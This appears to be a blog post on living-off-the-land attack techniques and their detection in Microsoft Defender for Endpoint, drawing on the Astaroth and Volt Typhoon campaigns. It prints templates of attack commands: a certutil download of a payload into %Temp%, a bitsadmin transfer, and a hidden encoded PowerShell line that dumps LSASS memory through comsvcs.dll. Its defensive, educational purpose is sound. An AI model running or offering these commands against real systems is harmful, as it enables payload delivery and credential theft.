# LotL techniques with MDE detection - Part 1 
Hello everyone,

For a long time, I have seen Living off the Land (LotL) techniques discussed in Microsoft Security blogs, and recently I have been learning various attack techniques, especially those related to LotL. That's why I believe this is a great time to share my learning and detection insights in MDE through this blog, in parts 1 and 2.

### What is living off the land ?

[Microsoft Security blog](https://www.microsoft.com/en-us/security/blog/2018/09/27/out-of-sight-but-not-invisible-defeating-fileless-malware-with-behavior-monitoring-amsi-and-next-gen-av/) explains that “living off the land”, as malware only uses resources already available in the operating system.

### [Astaroth “living-off-the-land”](https://www.microsoft.com/en-us/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/)
This is a somewhat older blog, but I love it because it includes some Windows LotL-related attacks in the attack flow.

1. ZIP/LNK/BAT
1. wmi
2. bitsadmin
3. certutil

Download / Upload
```
bitsadmin /transfer <name> [<type>] [/priority <job_priority>] [/ACLflags <flags>] [/DYNAMIC] <remotefilename> <localfilename>
```

```
certutil.exe -urlcache -f "<URL/Payload>" "%Temp%\demo.exe"
```

![alt text](image.png)
> Astaroth “living-off-the-land” attack chain showing multiple legitimate tools abused
---

### [Volt Typhoon](https://www.microsoft.com/en-us/security/blog/2023/05/24/volt-typhoon-targets-us-critical-infrastructure-with-living-off-the-land-techniques/)

1. WMI
2. LSASS Process dumping (LotL)
   - cmd.exe / powershell.exe
   - rundll32.exe
   - base64 encode 

```powershell
cmd.exe /c powershell -exec bypass -W hidden -nop -E <Base64: rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID lsass.dmp full>
```

![alt text](image-1.png)
>  Volt Typhoon attack diagram
---
- Mshta
- Regsvr32
- Scheduled Tasks

